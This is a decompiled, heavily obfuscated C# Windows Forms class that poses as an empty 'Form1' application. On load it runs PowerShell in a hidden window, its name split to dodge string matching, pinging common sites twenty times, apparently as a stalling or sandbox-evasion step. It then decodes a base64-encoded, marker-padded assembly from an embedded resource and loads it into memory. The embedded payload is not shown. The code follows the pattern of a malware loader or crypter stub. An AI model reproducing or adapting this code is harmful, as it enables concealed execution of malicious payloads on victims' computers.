using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Gwoxmyyntbdtc;
using jJAiRVyvJB7OUx0Uri;

namespace UZPtF6Nmq7ZwIvDAul;

public class uGB0I03gCw2brk3d9J : Form
{
	private IContainer jg8IFmRMs;

	private static uGB0I03gCw2brk3d9J FA0NWEwsjqOM5GrSJdU;

	public uGB0I03gCw2brk3d9J()
	{
		JR4duLHaUHjOwL2k4G.r9IbO7Yymm();
		((Form)this)._002Ector();
		qHinnh9F9();
	}

	private void z4s7xekvA(object sender, EventArgs e)
	{
		List<string> list = new List<string> { "google", "bing", "youtube" };
		for (int i = 0; i < 20; i++)
		{
			UPEZOg0eY("Test-Connection " + list[new Random().Next(list.Count - 1)] + ".com");
		}
		kDhX0GSGh();
		nlAad6kCE();
	}

	private void kDhX0GSGh()
	{
		((AppDomain)IquPjbwchDYvmlgneXG()).AssemblyResolve += LV5YYaIpL;
	}

	private void nlAad6kCE()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Text((string)lHnqi5wEpSx6T8odwaA(((Control)this).get_Text(), new ClassLibrary().Data()));
	}

	private Assembly LV5YYaIpL(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		string name = "Aekklpblmuk.Gwoxmyyntbdtc.dll";
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		byte[] rawAssembly = (byte[])GUaHoBwMq0uXt2l3kxS(Encoding.UTF8.GetString(array).Replace("不错6", string.Empty));
		return ((AppDomain)IquPjbwchDYvmlgneXG()).Load(rawAssembly);
	}

	private void UPEZOg0eY(string string_0)
	{
		string object_ = "po@wershe@ll".Replace("@", "");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		UkfVm7w3LwyT6eIEpPf(processStartInfo, object_);
		processStartInfo.Arguments = string_0;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		Process.Start(processStartInfo)!.WaitForExit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && jg8IFmRMs != null)
		{
			jg8IFmRMs.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void qHinnh9F9()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(379, 197));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)z4s7xekvA);
		((Control)this).ResumeLayout(false);
	}

	internal static bool eeEXJowhjnyd3Ie4r0b()
	{
		return FA0NWEwsjqOM5GrSJdU == null;
	}

	internal static uGB0I03gCw2brk3d9J y9KYBEw9ssbQam60MTQ()
	{
		return FA0NWEwsjqOM5GrSJdU;
	}

	internal static object IquPjbwchDYvmlgneXG()
	{
		return AppDomain.CurrentDomain;
	}

	internal static object lHnqi5wEpSx6T8odwaA(object object_0, object object_1)
	{
		return (string?)object_0 + (string?)object_1;
	}

	internal static object GUaHoBwMq0uXt2l3kxS(object object_0)
	{
		return Convert.FromBase64String((string)object_0);
	}

	internal static void UkfVm7w3LwyT6eIEpPf(object object_0, object object_1)
	{
		((ProcessStartInfo)object_0).FileName = (string)object_1;
	}
}
